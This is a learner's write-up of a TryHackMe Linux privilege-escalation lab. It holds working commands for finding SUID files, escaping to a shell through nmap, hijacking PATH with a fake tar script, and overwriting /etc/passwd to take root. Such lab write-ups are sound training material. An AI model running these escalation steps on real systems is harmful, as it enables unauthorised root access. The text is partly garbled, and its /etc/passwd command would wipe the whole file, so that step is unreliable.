# 🛡️ TryHackMe - Linux Privilege Escalation Arena Writeup

> **Platform:** TryHackMe  
> **Room:** Linux Privilege Escalation Arena  
> **Difficulty:** Medium–Hard  
> **Objective:** Practice and master multiple Linux privilege escalation techniques in a realistic CTF-style environment.

---

## 🛠 Tools & Techniques Used

- `find`, `grep`, `ps`, `sudo`, `id`, `uname`
- SUID Binaries
- Wildcard Injection
- Cron Jobs
- PATH Variable Manipulation
- Writable `/etc/passwd`
- Kerne

 Looking for SUID/SGID Files

 find / -type f -perm /4000 2>/dev/null

Writable Files & Permissions

find / -writable -type f 2>/dev/null
ls -la /etc/passwd

Exploitation Techniques (Selected Examples)

 1. SUID Binary – Nmap

nmap --interactive
!sh

3. PATH Variable Exploitation

#!/bin/bash
tar -czf /tmp/backup.tar.gz /home/user/

Created a malicious tar in a custom PATH:

echo '/bin/sh' > tar
chmod +x tar
export PATH=.:$PATH


3. Writable /etc/passwd

openssl passwd -1 'newpass'

Copied hash and replaced root's password field in /etc/passwd:

echo 'root:$1$hashedPass$xyz:0:0:root:/root:/bin/bash' > /etc/passwd
su root


Key Takeaways

Enumeration is everything – always check SUIDs, PATH, crons, sudo, and writable files.

Misconfigurations = Escalation – one small mistake can lead to root.

Practice builds intuition – arenas like this are gold for real-world prep.


 Room Completed
Successfully escalated privileges using various techniques across multiple challenge scenarios.

✅ Skills Strengthened:

Post-exploitation mindset

Script abuse & privilege abuse

Linux internals and kernel-based exploits


[Umar Farooq]
Cybersecurity Learner | Ethical Hacking Explorer
GitHub: TheRealUmarFarooq


